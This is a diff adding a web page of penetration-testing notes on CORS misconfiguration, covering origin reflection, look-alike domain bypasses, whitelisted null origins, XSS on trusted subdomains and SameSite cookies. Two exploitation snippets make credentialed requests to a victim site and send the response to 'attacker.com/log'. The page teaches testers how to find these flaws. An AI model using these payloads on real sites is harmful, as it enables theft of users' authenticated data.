@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn how misconfigured CORS policies can expose sensitive data through origin reflection, null origin whitelisting, and XSS on trusted subdomains.">
+  <title>offsecnotes | CORS misconfiguration</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>CORS misconfiguration</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#what-is-cors" id="toc-what-is-cors">What is CORS?</a></li>
+<li><a href="#origin-reflection-in-acao-header" id="toc-origin-reflection-in-acao-header">Origin Reflection in ACAO Header</a></li>
+<li><a href="#bypassing-origin-checks-with-similar-domains" id="toc-bypassing-origin-checks-with-similar-domains">Bypassing Origin Checks with Similar Domains</a></li>
+<li><a href="#whitelisted-null-origin" id="toc-whitelisted-null-origin">Whitelisted <code>null</code> Origin</a></li>
+<li><a href="#using-xss-on-a-trusted-subdomain-to-exploit-cors" id="toc-using-xss-on-a-trusted-subdomain-to-exploit-cors">Using XSS on a Trusted Subdomain to Exploit CORS</a></li>
+<li><a href="#the-role-of-samesite-cookies" id="toc-the-role-of-samesite-cookies">The Role of SameSite Cookies</a></li>
+</ul></div>
+  <hr>
+<p><strong>Impact</strong>: If a web response includes sensitive data (like an API key or CSRF token), and CORS is misconfigured, an attacker could steal that data using a malicious website.</p>
+<hr />
+<h2 id="what-is-cors">What is CORS?</h2>
+<p>CORS (Cross-Origin Resource Sharing) is a browser security feature that controls how web applications interact with resources hosted on different origins. It’s designed to prevent malicious websites from making unauthorized requests to other sites on behalf of the user.</p>
+<blockquote>
+<p><strong>Note</strong>: An “origin” in CORS includes the protocol, domain, and port. So <code>https://example.com</code> and <code>http://example.com</code> are considered different origins [<a href="https://developer.mozilla.org/en-US/docs/Glossary/Origin">↗</a>].</p>
+</blockquote>
+<hr />
+<h2 id="origin-reflection-in-acao-header">Origin Reflection in ACAO Header</h2>
+<p>Some vulnerable servers reflect the <code>Origin</code> header in the <code>Access-Control-Allow-Origin</code> response without validating it.</p>
+<p><strong>How to Detect</strong></p>
+<p>Send a request with a custom <code>Origin</code> header (e.g., <code>Origin: https://evil.com</code>) and check if the same origin is reflected back.</p>
+<pre class="http"><code>Access-Control-Allow-Origin: https://evil.com</code></pre>
+<blockquote>
+<p><strong>Warning</strong>: If <code>Access-Control-Allow-Credentials: true</code> is also present, an attacker can send authenticated requests from a malicious origin.</p>
+</blockquote>
+<p><strong>Exploitation Example</strong></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">var</span> req <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  req<span class="op">.</span><span class="at">onload</span> <span class="op">=</span> <span class="kw">function</span> () {</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    location <span class="op">=</span> <span class="st">&#39;https://attacker.com/log?data=&#39;</span> <span class="op">+</span> <span class="kw">this</span><span class="op">.</span><span class="at">responseText</span><span class="op">;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>  }<span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>  req<span class="op">.</span><span class="fu">open</span>(<span class="st">&#39;GET&#39;</span><span class="op">,</span> <span class="st">&#39;https://vulnerable-website.com/secret-data&#39;</span><span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>  req<span class="op">.</span><span class="at">withCredentials</span> <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>  req<span class="op">.</span><span class="fu">send</span>()<span class="op">;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="bypassing-origin-checks-with-similar-domains">Bypassing Origin Checks with Similar Domains</h2>
+<p>Some applications whitelist trusted origins without strict validation, making it possible to bypass checks using similar-looking domains.</p>
+<p><strong>Examples</strong>:</p>
+<ul>
+<li><code>hackersnormal-website.com</code></li>
+<li><code>normal-website.com.attacker.com</code></li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: You need to know or guess the whitelisted origins to attempt this.</p>
+</blockquote>
+<hr />
+<h2 id="whitelisted-null-origin">Whitelisted <code>null</code> Origin</h2>
+<p>If the server allows <code>null</code> as an origin, it may be vulnerable to data theft through sandboxed iframes.</p>
+<p><strong>How to Detect</strong></p>
+<p>Send a request with:</p>
+<pre class="http"><code>Origin: null</code></pre>
+<p>and check for:</p>
+<pre class="http"><code>Access-Control-Allow-Origin: null</code></pre>
+<p><strong>Exploitation Example</strong></p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span> <span class="er">sandbox</span><span class="ot">=</span><span class="st">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;data:text/html,</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span><span class="st">script&gt;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="st">  var req = new XMLHttpRequest();</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="st">  req.onload = function () {</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="st">    location = &#39;https://attacker.com/log?data=&#39; + this.responseText;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="st">  };</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="st">  req.open(&#39;GET&#39;, &#39;https://vulnerable-website.com/secret-data&#39;, true);</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="st">  req.withCredentials = true;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="st">  req.send();</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span><span class="st">/script&gt;&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="using-xss-on-a-trusted-subdomain-to-exploit-cors">Using XSS on a Trusted Subdomain to Exploit CORS</h2>
+<p>If a site allows CORS requests only from a trusted subdomain and you find an XSS vulnerability on that subdomain, you can use the XSS to steal data via CORS.</p>
+<p><strong>Example Response:</strong></p>
+<pre class="http"><code>Access-Control-Allow-Origin: https://sub.vulnerable.com
+Access-Control-Allow-Credentials: true</code></pre>
+<p><strong>Exploitation Flow:</strong></p>
+<ol type="1">
+<li>Find XSS on <code>https://sub.vulnerable.com</code>.</li>
+<li>Inject malicious script that performs a CORS request to the main domain.</li>
+<li>Steal the sensitive response.</li>
+</ol>
+<p>URL:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>https://sub.vulnerable.com/?xss=<span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="op">...</span>your<span class="op">-</span>code<span class="op">...</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="the-role-of-samesite-cookies">The Role of SameSite Cookies</h2>
+<p>CORS exploits often rely on the browser sending cookies along with cross-origin requests. This depends on the <code>SameSite</code> attribute of the cookie. To exploit CORS with <code>withCredentials=true</code>, the session cookie must be accessible (i.e., not blocked by <code>SameSite=Strict</code>).</p>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
